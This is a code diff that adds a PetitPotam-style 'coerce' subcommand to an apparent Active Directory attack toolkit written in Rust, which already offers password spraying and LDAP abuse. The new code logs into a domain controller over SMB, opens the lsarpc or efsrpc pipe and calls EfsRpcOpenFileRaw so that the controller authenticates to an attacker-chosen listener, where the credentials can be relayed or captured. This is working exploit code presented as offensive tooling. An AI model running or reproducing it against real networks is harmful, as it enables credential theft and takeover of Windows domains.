@@ -28,6 +28,26 @@ enum Command {
     Spray(SprayArgs),
     /// Active LDAP abuse: add-spn (targeted Kerberoast) / add-member / set-password.
     Abuse(AbuseArgs),
+    /// Coerce the DC to authenticate to a listener (PetitPotam / MS-EFSR).
+    Coerce(CoerceArgs),
+}
+
+#[derive(Parser)]
+struct CoerceArgs {
+    #[arg(long)]
+    host: String,
+    #[arg(long)]
+    domain: String,
+    #[arg(long)]
+    user: String,
+    #[arg(long)]
+    password: String,
+    /// Attacker host the DC should authenticate to (UNC target)
+    #[arg(long)]
+    listener: String,
+    /// Named pipe to try (lsarpc or efsrpc)
+    #[arg(long, default_value = "lsarpc")]
+    pipe: String,
 }
 
 #[derive(Parser)]
@@ -141,7 +161,29 @@ async fn main() -> Result<()> {
         Command::Lsa(a) => lsa(a).await,
         Command::Spray(a) => spray(a).await,
         Command::Abuse(a) => abuse(a).await,
+        Command::Coerce(a) => coerce(a).await,
     }
+}
+
+/// PetitPotam-style coercion: make the DC authenticate to `--listener` via MS-EFSR.
+async fn coerce(a: CoerceArgs) -> Result<()> {
+    use adhammer_dcerpc::efsr::CoerceClient;
+    use adhammer_smb::SmbClient;
+
+    let mut smb = SmbClient::connect(&a.host).await?;
+    smb.login(&a.host, &a.domain, &a.user, &a.password).await?;
+    smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
+    let pipe = smb.open_pipe(&a.pipe).await?;
+
+    let mut client = CoerceClient::bind(&mut smb, pipe).await?;
+    match client.coerce(&a.listener).await {
+        Ok(status) => {
+            println!("[+] EfsRpcOpenFileRaw accepted via \\{} — status {status:#010x}", a.pipe);
+            println!("    DC {} attempted auth to \\\\{}\\... (run a relay/listener to capture)", a.host, a.listener);
+        }
+        Err(e) => println!("[-] coercion via \\{} failed/patched: {e}", a.pipe),
+    }
+    Ok(())
 }
 
 /// Active LDAP abuse — the exploitation counterpart to the ACL findings the graph reports.
